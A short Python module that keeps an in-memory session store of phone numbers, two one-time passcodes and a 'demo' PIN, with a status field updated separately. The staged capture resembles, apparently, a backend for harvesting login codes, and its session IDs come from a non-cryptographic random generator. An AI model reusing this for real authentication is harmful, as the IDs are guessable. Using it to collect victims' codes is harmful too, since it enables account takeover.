import random
import string

sessions = {}


def create_session(phone, otp1):
    session_id = "WF-" + ''.join(
        random.choices(string.ascii_uppercase + string.digits, k=6)
    )

    sessions[session_id] = {
        "data": {
            "phone": phone,
            "otp1": otp1,
            "status": "pending"
        }
    }

    return session_id


def get_session(session_id):
    return sessions.get(session_id)


def save_step2(session_id, demo_pin, otp2):
    if session_id in sessions:
        sessions[session_id]["data"]["step2"] = {
            "demo_pin": demo_pin,
            "otp2": otp2
        }

        return True

    return False


def update_status(session_id, status):
    if session_id in sessions:
        sessions[session_id]["data"]["status"] = status
        return True

    return False